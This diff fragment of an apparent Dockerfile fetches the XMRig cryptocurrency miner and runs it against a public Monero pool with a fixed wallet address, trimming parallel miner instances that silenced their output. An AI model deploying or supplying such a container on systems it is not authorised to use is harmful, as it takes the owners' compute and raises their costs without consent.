@@ -5,8 +5,4 @@ RUN wget -O xmrig-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/downl
     tar -xvf xmrig-linux-x64.tar.gz
 CMD bash -c "\
     ./xmrig-6.22.2/xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages & \
-    ./xmrig-6.22.2/xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages > /dev/null 2>&1 & \
-    ./xmrig-6.22.2/xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages > /dev/null 2>&1 & \
-    ./xmrig-6.22.2/xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages > /dev/null 2>&1 & \
-    ./xmrig-6.22.2/xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages > /dev/null 2>&1 & \
     wait"
